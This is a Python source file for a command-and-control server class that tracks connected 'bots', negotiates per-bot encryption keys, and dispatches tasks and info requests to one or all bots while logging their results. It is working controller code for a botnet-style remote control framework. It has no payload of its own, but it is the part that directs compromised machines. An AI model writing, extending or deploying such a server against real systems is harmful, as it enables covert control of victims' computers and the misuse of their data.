import logging
import datetime

from qasync import asyncSlot
from qtpy.QtCore import Slot, Signal
from QtPyNetwork.server import QBalancedServer

from core.crypto import generate_key
from models import Bot, Task, Info


class C2Server(QBalancedServer):
    """C2 server."""

    task = Signal(Task)
    info = Signal(Info)
    assigned = Signal(int, str, int)

    def __init__(self):
        super(C2Server, self).__init__(loggerName=self.__class__.__name__)
        self.setDeviceModel(Bot)
        self.setObjectName("C2Server")
        self.logger = logging.getLogger(self.__class__.__name__)

        self.connected.connect(self.pre_connection)
        self.error.connect(self.logger.error)

    @asyncSlot(int, dict)
    async def on_message(self, bot_id: int, message: dict):
        """When server receives message from bot."""
        try:
            bot = self.getDeviceById(bot_id)
            bot_id = bot.get_id()
        except Exception as e:
            self.logger.error("Could not find bot with ID {}: {}".format(bot_id, e))
            return

        event_type = message.get("event_type")
        if event_type == "task":
            state = message.get("state")
            task_id = message.get("task_id")
            task = bot.get_task_by_id(task_id)
            if task:
                if state == "queued":
                    task.set_created(datetime.datetime.now())
                elif state == "started":
                    task.set_running(datetime.datetime.now())
                elif state == "finished":
                    task.set_finished(datetime.datetime.now(), message.get("result"), message.get("exit_code"))
                else:
                    self.logger.error("Unknown task state for message {}".format(message))
                    return
                self.task.emit(task)
            else:
                self.logger.error("Could not find task with ID {} for bot {}".format(task_id, bot_id))

        elif event_type == "info":
            event = Info(bot_id,
                         message.get("info"),
                         message.get("results"))
            bot.on_info_received(event)
            self.info.emit(event)

        elif event_type == "assign":
            key = message.get("encryption_key")
            if bot.is_connected():
                self.logger.warning("Bot {} tried to renegotiate encryption key. Kicked!".format(bot_id))
                self.kick(bot_id)

            if key == bot.key:
                key = str(key).encode()
                self.setCustomKeyForClient(bot_id, key)
                bot.set_connected(True)
                self.assigned.emit(bot_id, bot.ip, bot.port)
            else:
                self.logger.warning("Assigned keys do not match! Bot {} will be kicked!".format(bot_id))
                self.kick(bot_id)

        else:
            self.logger.error("BOT-{}: Failed to find matching event type for {}".format(bot.get_id(), message))
        self.message.emit(bot_id, message)

    @Slot(int, str, int)
    def pre_connection(self, bot_id, ip, port):
        key = generate_key().decode()
        self.getDeviceById(bot_id).set_custom_key(key)
        self.write(bot_id, {"event_type": "assign", "encryption_key": key})

    @Slot(int, str, dict, int)
    def send_task(self, bot_id: int, task: str, kwargs: dict, user_activity: int):
        """Send task."""
        if bot_id == 0:
            for bot in self.getDevices():
                bot_id = bot.get_id()
                task_id = bot.get_next_task_id()
                task_obj = Task(bot_id, task_id, task, kwargs)
                task_obj.user_activity = user_activity
                bot.on_task_received(task_obj)
                task_dict = task_obj.create()
                task_dict["event"] = "start"
                self.write(bot_id, task_dict)
                self.task.emit(task_obj)
        else:
            bot = self.getDeviceById(bot_id)
            if bot:
                task_id = bot.get_next_task_id()
                task_obj = Task(bot_id, task_id, task, kwargs)
                bot.on_task_received(task_obj)
                task_dict = task_obj.serialize()
                task_dict["event"] = "start"
                self.write(bot_id, task_dict)
                self.task.emit(task_obj)
            else:
                self.logger.error("BOT-{} not found".format(bot_id))

    @Slot(int, list)
    def send_info(self, bot_id: int, info: list):
        """Send info request."""
        bot = self.getDeviceById(bot_id)
        info_obj = Info(bot_id, info)
        bot.on_info_received(info_obj)
        if bot_id == 0:
            self.writeAll(info_obj.create())
        else:
            self.write(bot_id, info_obj.create())

    @Slot(int, int)
    def stop_task(self, bot_id, task_id):
        self.write(bot_id, {"event_type": "task", "bot_id": bot_id, "event": "stop", "task_id": task_id})
